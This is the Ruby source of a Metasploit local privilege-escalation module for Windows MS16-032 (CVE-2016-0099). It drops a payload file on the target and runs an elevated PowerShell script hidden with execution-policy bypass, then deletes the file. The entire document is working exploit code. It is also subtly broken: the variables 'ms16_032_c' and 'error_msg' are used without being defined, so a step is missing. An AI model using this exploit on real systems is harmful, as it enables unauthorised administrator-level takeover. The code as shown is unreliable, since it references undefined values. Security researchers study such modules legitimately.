# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;msf/core/payload_generator&#039;
require &#039;msf/core/exploit/powershell&#039;
require &#039;rex&#039;
 
class MetasploitModule < Msf::Exploit::Local
 
  Rank = NormalRanking
 
  include Msf::Exploit::Powershell
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::File
  include Msf::Post::Windows::ReflectiveDLLInjection
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;          => &#039;MS16-032 Secondary Logon Handle Privilege Escalation&#039;,
      &#039;Description&#039;   => %q{
        This module exploits the lack of sanitization of standard handles in Windows&#039; Secondary
        Logon Service.  The vulnerability is known to affect versions of Windows 7-10 and 2k8-2k12
        32 and 64 bit.  This module will only work against those versions of Windows with
        Powershell 2.0 or later and systems with two or more CPU cores.
      },
       &#039;License&#039;       => BSD_LICENSE,
       &#039;Author&#039;        =>
         [
           &#039;James Forshaw&#039;, # twitter.com/tiraniddo
           &#039;b33f&#039;,          # @FuzzySec, http://www.fuzzysecurity.com&#039;
           &#039;khr0x40sh&#039;
         ],
       &#039;References&#039;    =>
         [
           [ &#039;MS&#039;, &#039;MS16-032&#039;],
           [ &#039;CVE&#039;, &#039;2016-0099&#039;],
           [ &#039;URL&#039;, &#039;https://twitter.com/FuzzySec/status/723254004042612736&#039; ],
           [ &#039;URL&#039;, &#039;https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html&#039;]
         ],
        &#039;DefaultOptions&#039; =>
          {
            &#039;WfsDelay&#039; => 30,
            &#039;EXITFUNC&#039; => &#039;thread&#039;
          },
        &#039;DisclosureDate&#039; => &#039;Mar 21 2016&#039;,
        &#039;Platform&#039;      => [ &#039;win&#039; ],
        &#039;Targets&#039;        =>
          [
            # Tested on (32 bits):
            # * Windows 7 SP1
            [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
            # Tested on (64 bits):
            # * Windows 7 SP1
            # * Windows 8
            # * Windows 2012
            [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
          ],
        &#039;DefaultTarget&#039; => 0
      ))
 
    register_advanced_options(
      [
        OptString.new(&#039;W_PATH&#039;, [false, &#039;Where to write temporary powershell file&#039;, nil]),
        OptBool.new(  &#039;DRY_RUN&#039;, [false, &#039;Only show what would be done&#039;, false ]),
        # How long until we DELETE file, we have a race condition here, so anything less than 60
        # seconds might break
        OptInt.new(&#039;TIMEOUT&#039;, [false, &#039;Execution timeout&#039;, 60])
      ], self.class)
  end
 
  def get_arch
    arch = nil
 
    if sysinfo["Architecture"] =~ /(wow|x)64/i
      arch = ARCH_X86_64
    elsif sysinfo["Architecture"] =~ /x86/i
      arch = ARCH_X86
    end
 
    arch
  end
 
  def check
    os = sysinfo["OS"]
 
    if os !~ /win/i
      # Non-Windows systems are definitely not affected.
      return Exploit::CheckCode::Safe
    end
 
    Exploit::CheckCode::Detected
  end
 
  def exploit
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end
 
    arch1 = get_arch
    if check == Exploit::CheckCode::Safe
      print_error("Target is not Windows")
      return
    elsif arch1 == nil
      print_error("Architecture could not be determined.")
      return
    end
 
    # Exploit PoC from &#039;b33f&#039;
    ps_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2016-0099&#039;, &#039;cve_2016_0099.ps1&#039;)
    vprint_status("PS1 loaded from #{ps_path}")
    ms16_032 = File.read(ps_path)
 
    cmdstr = expand_path(&#039;%windir%&#039;) << &#039;\\System32\\windowspowershell\\v1.0\\powershell.exe&#039;
 
    if datastore[&#039;TARGET&#039;] == 0 && arch1 == ARCH_X86_64
      cmdstr.gsub!("System32","SYSWOW64")
      print_warning("Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell")
      vprint_warning("#{cmdstr}")
    end
 
    # payload formatted to fit dropped text file
    payl = cmd_psh_payload(payload.encoded,payload.arch,{
      encode_final_payload: false,
      remove_comspec: true,
      method: &#039;old&#039;
    })
 
    payl.sub!(/.*?(?=New-Object IO)/im, "")
    payl = payl.split("&#039;;$s.")[0]
    payl.gsub!("&#039;&#039;","&#039;")
    payl = "$s=#{payl}while($true){Start-Sleep 1000};"
 
    @upfile=Rex::Text.rand_text_alpha((rand(8)+6))+".txt"
    path = datastore[&#039;W_PATH&#039;] || pwd
    @upfile = "#{path}\\#{@upfile}"
    fd = session.fs.file.new(@upfile,"wb")
    print_status("Writing payload file, #{@upfile}...")
    fd.write(payl)
    fd.close
    psh_cmd = "IEX `$(gc #{@upfile})"
 
    #lpAppName
    ms16_032.gsub!("$cmd","\"#{cmdstr}\"")
    #lpcommandLine - capped at 1024b
    ms16_032.gsub!("$args1","\" -exec Bypass -nonI -window Hidden #{psh_cmd}\"")
 
 
    if ms16_032_c.size > 8100
      error_msg += "cmd.exe&#039;s 8kB character limit."
      print_error(error_msg)
    else
    end
 
    if datastore[&#039;DRY_RUN&#039;]
      print_good("cmd.exe /C powershell -exec Bypass -nonI -window Hidden #{ms16_032_c}")
      return
    end
 
    print_status("Executing exploit script...")
    cmd = "cmd.exe /C powershell -exec Bypass -nonI -window Hidden #{ms16_032_c}"
    args = nil
 
    begin
      process = session.sys.process.execute(cmd, args, {
        &#039;Hidden&#039; => true,
        &#039;Channelized&#039; => false
      })
    rescue
      print_error("An error occurred executing the script.")
    end
  end
 
  def cleanup
    sleep_t = datastore[&#039;TIMEOUT&#039;]
    vprint_warning("Sleeping #{sleep_t} seconds before deleting #{@upfile}...")
    sleep sleep_t
 
    begin
      rm_f(@upfile)
      print_good("Cleaned up #{@upfile}")
    rescue
      print_error("There was an issue with cleanup of the powershell payload script.")
    end
  end
end

